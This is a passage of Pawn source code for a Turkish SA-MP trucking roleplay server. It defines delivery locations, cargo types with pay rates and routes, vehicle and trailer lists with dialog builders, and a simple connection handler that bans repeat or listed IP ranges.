	{"780-7", -2681.23,  284.27,    4.17}, // ID = 299
	{"780-8", -2603.44,  413.51,   13.88}, // ID = 300
	{"780-9", -2591.99,  559.80,   14.45}, // ID = 301
	{"780-10", -2293.05,  560.02,   35.00}, // ID = 302
    {"SF Dolmus Merkez", -2273.42,  539.92,   35.00}, // ID = 303
    
    {"LS Dolmus Merkez", 2177.68, -1791.43,   13.39}, // ID = 304
	{"147-1", 2141.12, -1748.42,   13.38}, // ID = 305
	{"147-2", 2031.50, -1748.32,   13.37}, // ID = 306
	{"147-3", 2005.60, -1702.45,   13.37}, // ID = 307
	{"147-4", 2005.58, -1626.04,   13.37}, // ID = 308
	{"147-5", 2100.27, -1617.13,   13.36}, // ID = 309
	{"147-6", 2268.40, -1663.31,   15.27}, // ID = 310
	{"147-7", 2338.64, -1674.89,   13.38}, // ID = 311
	{"147-8", 2324.97, -1728.59,   13.37}, // ID = 312
	{"147-9", 2181.22, -1740.97,   13.36}, // ID = 313
	{"911-1", 2232.84, -1752.92,   13.38}, // ID = 314
	{"911-2", 2402.75, -1753.50,   13.37}, // ID = 315
	{"911-3", 2409.86, -1905.94,   13.37}, // ID = 316
	{"911-4", 2447.02, -1936.40,   13.29}, // ID = 317
	{"911-5", 2613.22, -1936.51,   13.36}, // ID = 318
	{"911-6", 2710.22, -1973.16,   13.30}, // ID = 319
	{"911-7", 2748.42, -1998.14,   13.30}, // ID = 320
	{"911-8", 2773.41, -1925.58,   13.29}, // ID = 321
	{"911-9", 2713.36, -1886.67,   10.87}, // ID = 322
	{"911-10", 2538.08, -1728.81,   13.37}, // ID = 323
	{"911-11", 2266.39, -1728.24,   13.37}, // ID = 324
	{"911-12", 2181.40, -1742.36,   13.36}, // ID = 325
	{"161-1", 2191.99, -1683.48,   13.85}, // ID = 326
	{"161-2", 2216.15, -1472.02,   23.81}, // ID = 327
	{"161-3", 2182.52, -1380.65,   23.82}, // ID = 328
	{"161-4", 2171.47, -1276.38,   23.81}, // ID = 329
	{"161-5", 2179.35, -1143.83,   24.87}, // ID = 330
	{"161-6", 2205.72, -1074.77,   39.02}, // ID = 331
	{"161-7", 2213.13, -1022.63,   60.52}, // ID = 332
	{"161-8", 2288.07, -1054.55,   49.18}, // ID = 333
	{"161-9", 2338.30, -1038.41,   52.68}, // ID = 334
	{"161-10", 2455.12, -971.74,   80.06}, // ID = 335
	{"161-11", 2579.27, -987.54,   80.16}, // ID = 336
	{"161-12", 2633.90, -1051.89,   69.40}, // ID = 337
	{"161-13", 2638.87, -1133.31,   64.65}, // ID = 338
	{"161-14", 2627.47, -1728.94,   11.03}, // ID = 339
	{"161-15", 2273.62, -1728.96,   13.37}, // ID = 340
	{"161-16", 2181.41, -1741.67,   13.36}, // ID = 341
	{"142-1", 2126.54, -1748.50,   13.39}, // ID = 342
	{"142-2", 1832.53, -1748.69,   13.37}, // ID = 343
	{"142-3", 1718.24, -1728.67,   13.37}, // ID = 344
	{"142-4", 1455.16, -1728.46,   13.37}, // ID = 345
	{"142-5", 1264.22, -1708.29,   13.37}, // ID = 346
	{"142-6", 1033.85, -1728.41,   13.38}, // ID = 347
	{"142-7",  867.28, -1766.57,   13.37}, // ID = 348
	{"142-8",  601.58, -1670.98,   15.92}, // ID = 349
	{"142-9",  400.25, -1648.18,   30.27}, // ID = 350
	{"142-10",  337.49, -1626.12,   33.02}, // ID = 351
	{"142-11",  403.69, -1418.52,   33.85}, // ID = 352
	{"142-12",  499.24, -1316.33,   15.69}, // ID = 353
	{"142-13",  705.10, -1143.90,   16.21}, // ID = 354
	{"142-14",  886.78, -998.64,   35.85}, // ID = 355
	{"142-15", 1020.69, -949.26,   42.27}, // ID = 356
	{"142-16", 1144.08, -928.80,   43.17}, // ID = 357
	{"142-17", 1358.31, -962.04,   33.72}, // ID = 358
	{"142-18", 1383.24, -1409.59,   13.37}, // ID = 359
	{"142-19", 1925.82, -1469.69,   13.37}, // ID = 360
	{"142-20", 2109.91, -1671.01,   13.83}, // ID = 361
	{"142-21", 2171.34, -1756.58,   13.44}, // ID = 362

    {"Emkatu Constructions", -1438.28, 3906.22,  100.87} // ID = 363
    
    
    
};

// ANTALYA 187 - 192
// KONYA  180 - 186
// TUGAYOGULLARI 178 - 179
// YENI TUGIS  106 - 111

// EMKATU 165 - 166
// MUROLAND 117 - 118
// MADISON 112 - 116

// KASTAMONU 134 - 140 - (87)
// HARBOUR 124 - 125
// LONGWAY 129 - 132
// ISTANBUL 119 - 123
// DIVER 126 - 128




// ************************************************************************************************************************************************************
// PPC_DefLoads
// ************************************************************************************************************************************************************

// Setup a custom type that holds all data about a load
enum TLoad
{
	LoadName[50], // The name of the load
	bool:Mafia, // Holds "true" if this load is wanted by the mafia
	Float:PayPerUnit, // Holds the price for every meter to haul this type of load (this gets multiplied by the distance to calculate the payment)
	PCV_Required, // This holds the vehicle-type the player needs to use this load (and automatically the player's class)
	FromLocations[30], // This array holds all loading-points for this load
	ToLocations[30] // This array holds all unloading-points for this load
}

new ALoads[][TLoad] =
{
	// LoadName, MafiaLoad, PayPerUnit, VehicleNeeded, From-Locations, To-Locations

	// Dummy Load (never used)
	{"Belirlenmedi", false, 0.00, 0, {0}, {0}}, // LoadID 0

	// Loads for ore trailer  AÇIK KASA DORSE YÜKLERÝ
	{"Cakil", false, 4.20, PCV_TruckerOreTrailer, {11}, {1, 2, 3, 108, 116, 184, 187}}, // LoadID 1
	{"Kum", false, 4.20, PCV_TruckerOreTrailer, {12}, {1, 2, 3, 4, 5, 108, 116, 184, 187}}, // LoadID 2
	{"Kaya", false, 4.20, PCV_TruckerOreTrailer, {11, 179}, {1, 2, 3, 4, 5, 108, 116}}, // LoadID 3
	{"Komur", true, 4.20, PCV_TruckerOreTrailer, {12}, {6, 7, 8, 55, 113}}, // LoadID 4
	{"Tas", false, 4.20, PCV_TruckerOreTrailer, {12}, {6, 9, 108, 116, 179}}, // LoadID 5
	{"Agac Parcalari", true, 4.20, PCV_TruckerOreTrailer, {13}, {7, 10, 113, 55, 112, 136}}, // LoadID 6
	{"Talas", true, 4.00, PCV_TruckerOreTrailer, {10, 179, 187}, {12, 14, 113, 55, 136}}, // LoadID 7
	{"Kuru Atik", false, 4.20, PCV_TruckerOreTrailer, {6, 15, 16, 55, 113, 179}, {17, 18, 19}}, // LoadID 8
	{"Enkaz", false, 4.20, PCV_TruckerOreTrailer, {17, 19, 108, 116, 184}, {6, 18, 20, 179}}, // LoadID 9
	{"Bugday", true, 4.20, PCV_TruckerOreTrailer, {21, 22, 67, 68, 74}, {18, 23, 24, 69, 75}}, // LoadID 10

	// Loads for liquids trailer // Sývý Dorse Yükleri
	{"Kursunsuz Benzin", true, 4.40, PCV_TruckerFluidsTrailer, {8, 25, 26, 115, 118, 122, 131, /*143,*/ 178, 192, 185, 265}, {27, 28, 29, 30, 31, 32, 33, 34, 85, 86, 115, 165}}, // LoadID 11
	{"Dizel", true, 4.40, PCV_TruckerFluidsTrailer, {8, 25, 26, 115, 118, 122, 131, /*143,*/ 185}, {27, 28, 29, 30, 31, 32, 33, 34, 85, 86, 165, 192, 178, 265}}, // LoadID 12
	{"Ucak Yakiti", true, 4.40, PCV_TruckerFluidsTrailer, {8, 25, 26, 115, 118, 122, 131, /*143,*/ 165, 185}, {35, 36, 81, 103, 109, 85, 86, 178, 265}}, // LoadID 13
	{"Ham Petrol", true, 4.40, PCV_TruckerFluidsTrailer, {8, 25, 26, 165, 178, 265}, {6, 115, 118, 122, 131, /*143,*/ 185, 265}}, // LoadID 14
	{"Sivi Nitrojen", true, 6.40, PCV_TruckerFluidsTrailer, {37, 38, 190}, {39, 40, 87, 112, 185, 165}}, // LoadID 15
	{"Kimyasallar", false, 4.40, PCV_TruckerFluidsTrailer, {37, 120, 125, 126, 178}, {6, 15, 39, 40, 87, 165}}, // LoadID 16
	{"Su", false, 6.20, PCV_TruckerFluidsTrailer, {37}, {15, 40, 41, 87}}, // LoadID 17
	{"Gres", false, 6.20, PCV_TruckerFluidsTrailer, {8, 25, 120, 125, 126}, {6, 10, 14, 42, 87}}, // LoadID 18
	{"Gubre", false, 4.20, PCV_TruckerFluidsTrailer, {37, 38}, {21, 22}}, // LoadID 19
	{"Sut", false, 4.20, PCV_TruckerFluidsTrailer, {21, 22, 68, 74, 127}, {43, 44, 45, 69}}, // LoadID 20
	{"Bira", true, 4.20, PCV_TruckerFluidsTrailer, {41, 75}, {44, 46, 110, 111, 191}}, // LoadID 21
	{"Etanol", true, 6.40, PCV_TruckerFluidsTrailer, {37, 41, 120, 125, 126, 165}, {26, 39, 40, 87, 106, 178}}, // LoadID 22

	// Loads for cargo trailer  KAPALI KASA DORSE YÜKLERÝ
	{"Erzak", true, 4.80, PCV_TruckerCargoTrailer, {7, 44, 47, 48, 38, 68, 74, 166, 179, 194}, {49, 50, 51, 52, 53, 191, 193}}, // LoadID 23
	{"Icecek", true, 4.60, PCV_TruckerCargoTrailer, {15, 54, 55, 68, 74, 127, 191, 193}, {49, 50, 51, 52, 53, 166, 179, 68}}, // LoadID 24
	{"Kutu Bira", true, 4.20, PCV_TruckerCargoTrailer, {56, 166}, {57, 58, 59, 60, 61}}, // LoadID 25
	{"Degerli Esyalar", true, 6.40, PCV_TruckerCargoTrailer, {24, 55, 71, 78, 107, 117, 124, 127, 130, 132, 188, 193,195}, {47, 48, 50, 137, 113, 121, 123, 127, 130/*, 142*/, 194, 195}}, // LoadID 26
	{"Elektronik Esyalar", true, 6.40, PCV_TruckerCargoTrailer, {7, 24, 48, 76, 138, 113, 121, 123, 130, 132/*, 142*/, 194, 195}, {50, 51, 62, 63, 71, 78, 107, 117, 124, 127, 189, 193, 195}}, // LoadID 27
	{"Spor Aletleri", true, 4.40, PCV_TruckerCargoTrailer, {47, 48, 166, 189}, {50, 53, 57, 137, 24}}, // LoadID 28
	{"Pano", true, 5.20, PCV_TruckerCargoTrailer, {10, 76, 87, 135, 136, 182, 195}, {4, 7, 18, 22}}, // LoadID 29
	{"Insaat Malzemesi", true, 6.40, PCV_TruckerCargoTrailer, {4, 87, 135, 183, 187}, {1, 2, 3, 5, 108, 116, 128, /*144,*/ 166, 179, 184, 124, 195}}, // LoadID 30
	{"Kurbanlik", false, 7.20, PCV_TruckerCargoTrailer, {21, 22, 74, 127}, {23, 43, 47, 130}}, // LoadID 31
	{"Et", false, 6.40, PCV_TruckerCargoTrailer, {43, 68, 74, 127}, {44, 49, 50, 51, 52, 53, 130}}, // LoadID 32
	{"Ofis Esyalari", true, 5.90, PCV_TruckerCargoTrailer, {7, 13, 24, 48, 76, 87, 135, 138, 113, 121, 123, 130, 132, /*142,*/ 166, 179, 124, 182, 193}, {9, 50, 51, 62, 63, 71, 78, 107, 117, 124, 127, 189, 194}}, // LoadID 33
	{"Tibbi Atik", false, 5.10, PCV_TruckerCargoTrailer, {79, 80, 82, 110}, {119, 120, 125, 126}}, // LoadID 33
	{"Silah", true, 8.00, PCV_TruckerCargoTrailer, {54, 81, 106, 132, 166, 266}, {9, 48, 55, 71, 78, 83, 113, 117, 123, 124, 130, /*142,*/ 186, 266}}, // LoadID 33

	// Loads for cement truck
	{"Cimento", false, 2.50, PCV_TruckerCementTruck, {12}, {1, 2, 3, 4, 108, 116, 128, /*144,*/ 184, 363}}, // LoadID 34

	// Loads for truckers without trailer  FLATBED VE DFT-30 YÜKLERÝ
	{"Erzak", false, 3.20, PCV_TruckerNoTrailer, {7, 44, 47, 48, 38, 69, 166, 193}, {49, 50, 51, 52, 53, 194}}, // LoadID 35
	{"Icecek", false, 3.20, PCV_TruckerNoTrailer, {15, 54, 55, 69, 194}, {49, 50, 51, 52, 53, 166, 193}}, // LoadID 36
	{"Bira", true, 3.20, PCV_TruckerNoTrailer, {56, 69}, {57, 58, 59, 60, 61}}, // LoadID 37
	{"Degerli Esyalar", true, 3.20, PCV_TruckerNoTrailer, {24, 55, 71, 78, 107, 117, 124, 127, 130, 132, 194, 195}, {47, 48, 50, 137, 113, 121, 123, 127, 130/*, 142*/, 193}}, // LoadID 38
	{"Elektronik Esya", true, 3.20, PCV_TruckerNoTrailer, {7, 24, 48, 76, 138, 113, 121, 123, 130, 132/*, 142*/, 193, 195}, {50, 51, 62, 63, 71, 78, 107, 117, 124, 127, 194}}, // LoadID 39
	{"Spor Aletleri", false, 3.20, PCV_TruckerNoTrailer, {47, 48, 194, 195}, {50, 53, 57, 137, 193}}, // LoadID 40
	{"Pano", false, 3.20, PCV_TruckerNoTrailer, {10, 76, 87, 135, 136, 182, 195}, {4, 7, 18, 22}}, // LoadID 41
	{"Insaat Malzemesi", true, 3.20, PCV_TruckerNoTrailer, {4, 87, 135, 166, 183}, {1, 2, 3, 5, 108, 116, 128, /*144,*/ 166, 184, 189}}, // LoadID 42
	{"Kurbanlik", false, 3.20, PCV_TruckerNoTrailer, {21, 22, 74, 127}, {23, 43, 47}}, // LoadID 43
	{"Et", false, 3.20, PCV_TruckerNoTrailer, {43}, {44, 49, 50, 51, 52, 53}}, // LoadID 44
	{"Kagit", false, 3.20, PCV_TruckerNoTrailer, {56, 193, 194}, {57, 58, 59, 60, 61}}, // LoadID 45

	// Loads for pilots
	{"Yolcu", false, 8.10, PCV_PilotPlane, {88, 89, 92, 93, 97, 98, 101, 103, 109, 145, 146, 180, 181}, {88, 89, 92, 93, 97, 98, 101, 103, 109, 145, 146, 180, 181}}, // LoadID 46
	{"Kargo", false, 8.10, PCV_PilotPlane, {90, 91, 94, 95, 96, 99, 100, 102, 103, 109, 146, 180, 181}, {90, 91, 94, 95, 96, 99, 100, 102, 103, 109, 146, 180, 181}}, // LoadID 47
	{"Yolcu", false, 8.10, PCV_PilotHelicopter, {88, 89, 92, 93, 97, 98, 101, 103, 109, 145, 180, 181}, {88, 89, 92, 93, 97, 98, 101, 103, 109, 145, 180, 181}}, // LoadID 48

	// Loads for mafia
	{"Eroin", false, 6.50, PCV_MafiaVan, {7, 44, 47, 48}, {49, 50, 51, 52, 53}}, // LoadID 49
	{"Bonzai", false, 6.50, PCV_MafiaVan, {15, 54, 55}, {49, 50, 51, 52, 53}}, // LoadID 50
	{"Kacak sigara", true, 6.50, PCV_MafiaVan, {56}, {57, 58, 59, 60, 61}}, // LoadID 51
	{"Sahte Icki", false, 6.50, PCV_MafiaVan, {24, 55}, {47, 48, 50}}, // LoadID 52
	{"Elektronik Esya", true, 6.50, PCV_MafiaVan, {7, 24, 48}, {50, 51, 62, 63}}, // LoadID 53
	{"Sahte Para", false, 6.50, PCV_MafiaVan, {47, 48}, {50, 53, 57}}, // LoadID 54
	{"Degerli Parcalar", false, 6.50, PCV_MafiaVan, {10}, {4, 7, 18, 22}}, // LoadID 55
	{"Esrar", false, 6.50, PCV_MafiaVan, {4}, {1, 2, 3, 5}}, // LoadID 56
	{"Calinti Telefonlar", false, 6.50, PCV_MafiaVan, {21, 22}, {23, 43, 47}}, // LoadID 57
	{"Sahte Belgeler", false, 6.50, PCV_MafiaVan, {43}, {44, 49, 50, 51, 52, 53}}, // LoadID 58
	{"Kacak Cay", false, 6.50, PCV_MafiaVan, {14}, {9, 62}}, // LoadID 59

	//Gunoier Cöpcü Çöpçü mesleði bunu kullanmýyor artýk!

	{"Eski Tekerlekler", false, 8.90, PCV_GTrash, {148, 151, 154}, {147}}, // LoadID 60
	{"Copler", false, 8.90, PCV_GTrash, {148, 149, 150, 152, 153}, {147}}, // LoadID 61

	//Bankaci

	{"Para", true, 9.50, PCV_BankaSecuricar, {155, 157, 158, 160, 161, 162}, {164}}, // LoadID 62
	{"Altin", true, 9.50, PCV_BankaSecuricar, {156, 159, 162, 163}, {164}}, // LoadID 63

	//Itfaiyeci

	{"Yangin", false, 9.00, PCV_FireFiretruck, {167, 169, 170, 171, 172, 173, 174, 175, 176, 177}, {168}} // LoadID 62


};
#pragma tabsize 0

// This function returns a string (array) that holds all ProductID's that are linked to a certain vehicletype (and player class)
stock Product_GetList(PCV_Needed, &NumProducts)
{
	// Setup local variables
	new ProductList[50];

	// Loop through all products
	for (new i; i < sizeof(ALoads); i++)
	{
		// Check if there aren't 50 products found (and added to the ProductList) yet
		if (NumProducts < 50)
		{
			// Check if the current product has the same PCV_Needed
			if (ALoads[i][PCV_Required] == PCV_Needed)
			{
				// Add the ProductID to the ProductList
				ProductList[NumProducts] = i;
				// Increase the counter NumProducts
				NumProducts++;
			}
		}
	}

	// Return the ProductList
	return ProductList;
}

public OnIncomingConnection(playerid, ip_address[], port)
{
    new output[10][10];
    strexplode(output, ip_address, ".");
    new szCmd[64];

    if(!strcmp(output[0][0], "200") || !strcmp(output[0][0], "201"))
    {
    format(szCmd, sizeof(szCmd), "banip %s", ip_address);
	SendRconCommand(szCmd);
    BlockIpAddress(ip_address, 60000 * 10000);
    Ban(playerid);
    printf("BLOCKED:%s",ip_address);
    }
     // Anti Incoming Connection
 	new RCNCmd[80];

	if(!strcmp(SonGIP, ip_address, true))
	{
	    IPSayi++;
		if(IPSayi == 4)
		{
			format(RCNCmd, 80, "banip %s", ip_address);
			SendRconCommand(RCNCmd);
		}
	}

	format(SonGIP, 40, ip_address);

    return 1;
}

// This function returns a random products for the given vehicletype (and player class)
stock Product_GetRandom(PCV_Needed)
{
	// Setup local variables
	new ProductList[50], NumProducts;

	// Get the entire product-list for this vehicle and class, and also the amount of products
	ProductList = Product_GetList(PCV_Needed, NumProducts);

	// Get a random product from this list and return it
	return ProductList[random(NumProducts)];
}

// This function returns a random startlocation from the given product (load)
stock Product_GetRandomStartLoc(ProductID)
{
	// Setup local variables
	new NumProducts;

	// First find out how many valid start-locations there are in this product
	for (new i; i < 30; i++)
	{
		// If the product has a valid location in this index
		if (ALoads[ProductID][FromLocations][i] != 0)
		    NumProducts++; // Count the number of valid start-locations
		else // A start-location with ID 0 has been found (dummy-location)
		    break; // Stop counting
	}

	// Return the LocationID that's stored at a random index
	return ALoads[ProductID][FromLocations][random(NumProducts)];
}

// This function returns a random endlocation from the given product (load)
stock Product_GetRandomEndLoc(ProductID)
{
	// Setup local variables
	new NumProducts;

	// First find out how many valid end-locations there are in this product
	for (new i; i < 30; i++)
	{
		// If the product has a valid location in this index
		if (ALoads[ProductID][ToLocations][i] != 0)
		    NumProducts++; // Count the number of valid end-locations
		else // An end-location with ID 0 has been found (dummy-location)
		    break; // Stop counting
	}

	// Return the LocationID that's stored at a random index
	return ALoads[ProductID][ToLocations][random(NumProducts)];
}

// ************************************************************************************************************************************************************
// PPC_DefCars
// ************************************************************************************************************************************************************

enum TCar
{
	CarName[50], // Holds the name of the car
	CarModel // Holds the model-ID of the car
}

new ACars[][TCar] =
{
	{"Admiral", 445},			{"Alpha", 602},             {"Ambulance", 416},			{"Baggage", 485},           // ID 0, 1, 2, 3
	{"Bandito", 568},			{"Banshee", 429},			{"Barracks", 433},			{"Benson", 499},            // ID 4, 5, 6, 7
	{"Berkley's RC Van", 459},	{"BF Injection", 424},  	{"Blade", 536},				{"Blista Compact", 496},    // ID 8, 9, 10, 11
	{"Bloodring Banger", 504},	{"Bobcat", 422},			{"Boxville 1", 498},		{"Boxville 2", 609},        // ID 12, 13, 14, 15
	{"Bravura", 401},			{"Broadway", 575},			{"Buccaneer", 518},			{"Buffalo", 402},           // ID 16, 17, 18, 19
	{"Bullet", 541},            {"Burrito", 482},			{"Bus", 431},				{"Cabbie", 438},            // ID 20, 21, 22, 23
	{"Caddy", 457},				{"Cadrona", 527},   		{"Camper", 483},			{"Cement Truck", 524},      // ID 24, 25, 26, 27
	{"Cheetah", 415},			{"Clover", 542},			{"Club", 589},				{"Coach", 437},             // ID 28, 29, 30, 31
	{"Combine Harvester", 532},	{"Comet", 480},				{"DFT-30", 578},			{"Dozer", 486},             // ID 32, 33, 34, 35
	{"Dumper", 406},            {"Dune", 573},				{"Elegant", 507},			{"Elegy", 562},             // ID 36, 37, 38, 39
	{"Emperor", 585},			{"Enforcer", 427},			{"Esperanto", 419},			{"Euros", 587},             // ID 40, 41, 42, 43
	{"FBI Rancher", 490},		{"FBI Truck", 528},			{"Feltzer", 533},			{"Firetruck", 407},         // ID 44, 45, 46, 47
	{"Firetruck LA", 544},		{"Flash", 565},				{"Flatbed", 455},			{"Forklift", 530},          // ID 48, 49, 50, 51
	{"Fortune", 526},			{"Glendale", 466},			{"Greenwood", 492},			{"Hermes", 474},            // ID 52, 53, 54, 55
	{"Hotdog", 588},			{"Hotknife", 434},			{"Hotring Racer 1", 494},	{"Hotring Racer 2", 502},   // ID 56, 57, 58, 59
	{"Hotring Racer 3", 503},	{"Huntley", 579},			{"Hustler", 545},			{"Infernus", 411},          // ID 60, 61, 62, 63
	{"Intruder", 546},			{"Jester", 559},            {"Journey", 508},			{"Kart", 571},              // ID 64, 65, 66, 67
	{"Landstalker", 400},       {"Linerunner", 403},		{"Majestic", 517},			{"Manana", 410},            // ID 68, 69, 70, 71
	{"Merit", 551},				{"Mesa", 500},				{"Monster", 444},			{"Monster A", 556},         // ID 72, 73, 74, 75
	{"Monster B", 557},         {"Moonbeam", 418},			{"Mower", 572},				{"Mr Whoopee", 423},        // ID 76, 77, 78, 79
	{"Mule", 414},  			{"Nebula", 516},            {"Newsvan", 582},			{"Oceanic", 467},           // ID 80, 81, 82, 83
	{"Packer", 443},			{"Patriot", 470},			{"Perenniel", 404},			{"Phoenix", 603},           // ID 84, 85, 86, 87
	{"Picador", 600},			{"Police Car (LSPD)", 596},	{"Police Car (LVPD)", 598},	{"Police Car (SFPD)", 597}, // ID 88, 89, 90, 91
	{"Police Ranger", 599},		{"Pony", 413},				{"Premier", 426},			{"Previon", 436},           // ID 92, 93, 94, 95
	{"Primo", 547},				{"Rancher 1", 489},			{"Rancher 2", 505},			{"Regina", 479},            // ID 96, 97, 98, 99
	{"Remington", 534},			{"Rhino", 432},             {"Roadtrain", 515},			{"Romero", 442},            // ID 100, 101, 102, 103
	{"Rumpo", 440},				{"Sabre", 475},				{"Sadler", 543},			{"Sandking", 495},          // ID 104, 105, 106, 107
	{"Savanna", 567},			{"Securicar", 428},			{"Sentinel", 405},			{"Slamvan", 535},           // ID 108, 109, 110, 111
	{"Solair", 458},			{"Stafford", 580},			{"Stallion", 439},			{"Stratum", 561},           // ID 112, 113, 114, 115
	{"Stretch", 409},			{"Sultan", 560},			{"Sunrise", 550},			{"Super GT", 506},          // ID 116, 117, 118, 119
	{"S.W.A.T.", 601},			{"Sweeper", 574},			{"Tahoma", 566},			{"Tampa", 549},             // ID 120, 121, 122, 123
	{"Tanker", 514},			{"Taxi", 420},				{"Tornado", 576},			{"Towtruck", 525},          // ID 124, 125, 126, 127
	{"Tractor", 531},			{"Trashmaster", 408},		{"Tug", 583},				{"Turismo", 451},           // ID 128, 129, 130, 131
	{"Uranus", 558},            {"Utility Van", 552},		{"Vincent", 540},			{"Virgo", 491},             // ID 132, 133, 134, 135
	{"Voodoo", 412},			{"Walton", 478},			{"Washington", 421},		{"Willard", 529},           // ID 136, 137, 138, 139
	{"Windsor", 555},		    {"Yankee", 456},            {"Yosemite", 554},			{"ZR-350", 477}             // ID 140, 141, 142, 143
};

// This function creates a list of cars, starting from the FirstCar and automatically shows the dialog
CarList_Create(playerid)
{
	// Setup local variables
	new Counter, CarList[500], DialogTitle[128];

	// Only add 10 cars to the list, starting from the FirstCar
	for (new i = APlayerData[playerid][DialogCarFirstCar]; i < sizeof(ACars); i++)
	{
		// Increase a counter (which holds the number of cars that have been added to the list
		Counter++;

		// Check if the maximum hasn't been reached yet
		if (Counter <= 10)
		{
		    // Add the carname to the list
		    if (strlen(CarList) == 0) // If this is the start of the list (no cars have been added yet)
				format(CarList, 500, "%s", ACars[i][CarName]); // Add the name of the car at the start of the carlist
		    else
				format(CarList, 500, "%s%s%s", CarList, "\n", ACars[i][CarName]); // Add the name of the next car to the list on the next line
		}
		else // 10 cars have been added to the list (now Counter = 11)
		{
		    // Add an empty line and "Next..." to the list to let the player know there are more cars to choose from
			format(CarList, 500, "%s%s%s", CarList, "\n \n", TXT_DialogEntryNext);
			// Also stop the For-loop
			break;
		}
	}

	// Construct the title for the dialog (to include a page number)
	format(DialogTitle, 128, TXT_DialogCarTitle, (APlayerData[playerid][DialogCarFirstCar] / 10) + 1);
	// Ask which car the player wants to have by showing the dialog
	ShowPlayerDialog(playerid, DialogCar, DIALOG_STYLE_LIST, DialogTitle, CarList, TXT_DialogButtonSpawn, TXT_DialogButtonCancel);

	return 1;
}

// ************************************************************************************************************************************************************
// PPC_DefPlanes
// ************************************************************************************************************************************************************

enum TPlane
{
	PlaneName[50], // Holds the name of the Plane
	PlaneModel // Holds the model-ID of the Plane
}

new APlanes[][TPlane] =
{
	{"Andromada", 592},		{"AT400", 577}, 	{"Beagle", 511},				{"Cargobob", 548},          // ID 0, 1, 2, 3
	{"Cropduster", 512},	{"Dodo", 593},		{"Hunter", 425},				{"Hydra", 520},             // ID 4, 5, 6, 7
	{"Leviathan", 417},		{"Maverick", 487},	{"Nevada", 553},				{"Police Maverick", 497},   // ID 8, 9, 10, 11
	{"Raindance", 563},		{"Rustler", 476},	{"SAN News Maverick", 488},		{"Seasparrow", 447},        // ID 12, 13, 14, 15
	{"Shamal", 519},		{"Skimmer", 460},	{"Sparrow", 469},				{"Stuntplane", 513}         // ID 16, 17, 18, 19
};

// This function creates a list of Planes, starting from the FirstPlane and automatically shows the dialog
PlaneList_Create(playerid)
{
	// Setup local variables
	new Counter, PlaneList[500], DialogTitle[128];

	// Only add 10 Planes to the list, starting from the FirstPlane
	for (new i = APlayerData[playerid][DialogPlaneFirstPlane]; i < sizeof(APlanes); i++)
	{
		// Increase a counter (which holds the number of Planes that have been added to the list
		Counter++;

		// Check if the maximum hasn't been reached yet
		if (Counter <= 10)
		{
		    // Add the Planename to the list
		    if (strlen(PlaneList) == 0) // If this is the start of the list (no Planes have been added yet)
				format(PlaneList, 500, "%s", APlanes[i][PlaneName]); // Add the name of the Plane at the start of the Planelist
		    else
				format(PlaneList, 500, "%s%s%s", PlaneList, "\n", APlanes[i][PlaneName]); // Add the name of the next Plane to the list on the next line
		}
		else // 10 Planes have been added to the list (now Counter = 11)
		{
		    // Add an empty line and "Next..." to the list to let the player know there are more Planes to choose from
			format(PlaneList, 500, "%s%s%s", PlaneList, "\n \n", TXT_DialogEntryNext);
			// Also stop the For-loop
			break;
		}
	}

	// Construct the title for the dialog (to include a page number)
	format(DialogTitle, 128, TXT_DialogPlaneTitle, (APlayerData[playerid][DialogPlaneFirstPlane] / 10) + 1);
	// Ask which Plane the player wants to have by showing the dialog
	ShowPlayerDialog(playerid, DialogPlane, DIALOG_STYLE_LIST, DialogTitle, PlaneList, TXT_DialogButtonSpawn, TXT_DialogButtonCancel);

	return 1;
}

// ************************************************************************************************************************************************************
// PPC_DefTrailers
// ************************************************************************************************************************************************************

enum TTrailer
{
	TrailerName[50], // Holds the name of the Trailer
	TrailerModel // Holds the model-ID of the Trailer
}

new ATrailers[][TTrailer] =
{
	{"Article Trailer", 435},	{"Article Trailer 2", 450}, 	{"Article Trailer 3", 591},		{"Baggage Trailer A", 606},	// ID 0, 1, 2, 3
	{"Baggage Trailer B", 607},	{"Farm Trailer", 610},			{"Petrol Trailer", 584},		{"Stairs Trailer", 608},    // ID 4, 5, 6, 7
	{"Utility Trailer", 611}                                                                                                // ID 8
};

// This function creates a list of Trailers, starting from the FirstTrailer and automatically shows the dialog
TrailerList_Create(playerid)
{
	// Setup local variables
	new Counter, TrailerList[500], DialogTitle[128];

	// Only add 10 Trailers to the list, starting from the FirstTrailer
	for (new i = APlayerData[playerid][DialogTrailerFirstTrailer]; i < sizeof(ATrailers); i++)
	{
		// Increase a counter (which holds the number of Trailers that have been added to the list
		Counter++;

		// Check if the maximum hasn't been reached yet
		if (Counter <= 10)
		{
		    // Add the Trailername to the list
		    if (strlen(TrailerList) == 0) // If this is the start of the list (no Trailers have been added yet)
				format(TrailerList, 500, "%s", ATrailers[i][TrailerName]); // Add the name of the Trailer at the start of the Trailerlist
		    else
				format(TrailerList, 500, "%s%s%s", TrailerList, "\n", ATrailers[i][TrailerName]); // Add the name of the next Trailer to the list on the next line
		}
		else // 10 Trailers have been added to the list (now Counter = 11)
		{
		    // Add an empty line and "Next..." to the list to let the player know there are more Trailers to choose from
			format(TrailerList, 500, "%s%s%s", TrailerList, "\n \n", TXT_DialogEntryNext);
			// Also stop the For-loop
			break;
		}
	}

	// Construct the title for the dialog (to include a page number)
	format(DialogTitle, 128, TXT_DialogTrailerTitle, (APlayerData[playerid][DialogTrailerFirstTrailer] / 10) + 1);
	// Ask which Trailer the player wants to have by showing the dialog
	ShowPlayerDialog(playerid, DialogTrailer, DIALOG_STYLE_LIST, DialogTitle, TrailerList, TXT_DialogButtonSpawn, TXT_DialogButtonCancel);

	return 1;
}

// ************************************************************************************************************************************************************
// PPC_DefBuyableVehicles
// ************************************************************************************************************************************************************

#define VClassBike          1
#define VClassBoat          2
#define VClassConvertible   3
#define VClassHelicopter    4
#define VClassIndustrial    5
#define VClassLowRider      6
#define VClassOffRoad       7
#define VClassPlane         8
#define VClassPublic        9
#define VClassRCVehicle     10
#define VClassSaloons       11
#define VClassSportCar      12
#define VClassStationCar    13
#define VClassTrailer       14
#define VClassUnique        15

enum TBuyableVehicle
{
	CarName[50], // Holds the name of the vehicle
	VehicleClass, // Holds the ID of the vehicleclass
	CarModel, // Holds the model-ID of the vehicle
	Price // Holds the price for the vehicle (renting it will be 10% of this price)
}

new ABuyableVehicles[][TBuyableVehicle] =
{
	{"Admiral", VClassSaloons, 445, 1000000},
	{"Alpha", VClassSportCar, 602, 2000000},
//	{"Ambulance", VClassPublic, 416, 50000},
//	{"Andromada", VClassPlane, 592, 50000},
//	{"Article Trailer", VClassTrailer, 591, 50000},
//	{"AT400", VClassPlane, 577, 50000},
